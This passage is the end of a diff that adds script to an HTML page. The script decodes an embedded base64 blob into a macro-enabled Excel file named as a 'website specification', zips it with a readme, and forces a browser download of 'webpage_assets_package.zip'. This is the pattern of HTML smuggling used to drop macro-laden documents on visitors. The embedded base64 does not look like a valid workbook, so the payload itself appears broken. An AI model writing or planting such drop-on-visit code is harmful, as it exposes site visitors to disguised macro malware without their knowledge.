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";
+
+            // Helper function to decode standard Base64 string data safely into raw typed byte values
+            function convertBase64ToBlob(base64Data, mimeType) {
+                const binaryString = window.atob(base64Data);
+                const len = binaryString.length;
+                const bytes = new Uint8Array(len);
+                for (let i = 0; i < len; i++) {
+                    bytes[i] = binaryString.charCodeAt(i);
+                }
+                return new Blob([bytes], { type: mimeType });
+            }
+
+            // Convert raw Base64 workbook into a clean typed File Blob object
+            const xlsmBlob = convertBase64ToBlob(xlsmBase64, "application/vnd.ms-excel.sheet.macroEnabled.12");
+
+            // Add the text specification and macro file structure into the active JSZip archive instance
+            zip.file("readme_specifications.txt", textSpecs);
+            zip.file("website_specification.xlsm", xlsmBlob);
+
+            // Execute local dynamic zip compilation and generate browser download click pipeline
+            zip.generateAsync({ type: "blob" })
+                .then((blobContent) => {
+                    const downloadLink = document.createElement('a');
+                    downloadLink.href = URL.createObjectURL(blobContent);
+                    downloadLink.download = "webpage_assets_package.zip";
+                    
+                    document.body.appendChild(downloadLink);
+                    downloadLink.click();
+                    document.body.removeChild(downloadLink);
+                })
+                .catch((error) => {
+                    console.error("Asset tracking script failed to process compression archive:", error);
+                });
+        });
+    </script>
+
+</body>
+</html>
